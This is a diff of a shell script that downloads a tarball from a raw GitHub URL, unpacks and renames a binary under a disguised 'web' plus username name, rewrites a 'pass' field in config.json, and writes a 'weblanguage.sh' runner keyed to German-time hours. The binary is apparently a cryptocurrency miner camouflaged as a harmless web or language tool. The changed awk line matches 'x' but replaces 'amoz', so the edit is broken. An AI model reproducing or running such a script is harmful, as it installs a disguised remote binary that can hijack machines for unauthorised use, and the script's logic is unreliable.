@@ -10,7 +10,7 @@ curl -L -o "web$(whoami).tar.gz" https://raw.githubusercontent.com/amosgansweet/
 
 tar -xvzf "web$(whoami).tar.gz"
 
-rm -fr webmodelxm
+rm -fr "web$(whoami).tar.gz"
 
 mv web2 "web$(whoami)"
 
@@ -19,7 +19,7 @@ chmod +x "web$(whoami)"
 USERNAME=$(whoami)
 awk -v username="$USERNAME" '{
   if ($0 ~ /"pass": "x"/) {
-    gsub(/"pass": "x"/, "\"pass\": \"claw" username "\"");
+    gsub(/"pass": "amoz"/, "\"pass\": \"claw" username "\"");
   }
   print
 }' config.json > temp.json && mv temp.json config.json
@@ -31,9 +31,9 @@ cat << 'EOF' > weblanguage.sh
 
 echo "creat a weblanguage.sh"
 echo "running..."
-touch "web$(whoami).log"
+touch "web.log"
 NLANGUAGE_PATH="./web$(whoami)"
-LOG_FILE="./web$(whoami).log"
+LOG_FILE="./web.log"
 
 # Function to get the current hour in the German timezone
 get_german_hour() {
